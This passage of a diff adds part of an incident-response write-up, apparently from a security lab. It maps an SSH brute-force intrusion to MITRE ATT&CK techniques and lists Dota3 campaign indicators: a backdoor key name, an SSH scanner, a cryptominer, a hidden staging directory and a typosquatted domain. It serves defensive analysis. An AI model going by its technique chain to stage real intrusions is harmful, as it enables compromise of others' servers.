+`nohup`, ensuring it continued after the session ended.
+
+---
+
+## Section 2 — Complete Attack Chain
+
+### MITRE ATT&CK Final Mapping
+
+| Stage | Action | MITRE Technique |
+|---|---|---|
+| Initial Access | SSH brute force → `itsupport` login | T1110 — Brute Force |
+| Execution | `debug.sh` and `helper.sh` run via bash | T1059.004 — Unix Shell |
+| Discovery | `uname`, `lscpu`, `free`, `ps`, `find` | T1082, T1057, T1083 |
+| Credential Access | `passwd` piped with new credentials | T1098 — Account Manipulation |
+| Persistence | SSH key added to `authorized_keys` | T1098.004 — SSH Authorized Keys |
+| Persistence | Cron job planted post root login | T1053.003 — Cron |
+| Defense Evasion | Hidden `/tmp/.X26-unix` directory | T1564.001 — Hidden Files |
+| Defense Evasion | Output suppressed via `/dev/null` | T1562 — Impair Defenses |
+| Defense Evasion | `nohup` for detached execution | T1036 — Masquerading |
+| Lateral Movement | `tsm` SSH scanner against 192.168/172.16 | T1021.004 — SSH |
+| Collection | `tar`, `gzip` to archive files | T1560 — Archive Collected Data |
+| Exfiltration | `sftp-server` invoked manually | T1048 — Exfiltration Over Alternative Protocol |
+| Impact | `initall` cryptominer deployed | T1496 — Resource Hijacking |
+
+---
+
+### Named Threat — The Dota3 Campaign
+
+The combination of indicators found across this investigation mapped 
+to a known threat campaign:
+
+```c
+dota3.tar.gz        → campaign-named malware archive
+mdrfckr             → unique attacker SSH key signature
+tsm                 → SSH credential scanner
+initall             → cryptominer binary
+/tmp/.X26-unix      → known staging directory pattern
+drobbox-online.thm  → typosquatted delivery domain
+```
+
+<Callout type="key">
+  **FINAL CONCLUSION:** What the SIEM flagged as a discovery alert was 
+  the visible tip of a fully executed intrusion. The attacker gained 
+  initial access via SSH brute force, staged tools, manipulated 
+  credentials, implanted an SSH backdoor, scanned the internal network 
+  for lateral movement targets, and deployed a cryptominer — all within 
+  a single audit log window. The SIEM missed the first three hours of 
+  the attack entirely and only triggered at the discovery phase. The 
+  full chain was only visible through manual auditd log analysis.
+</Callout>
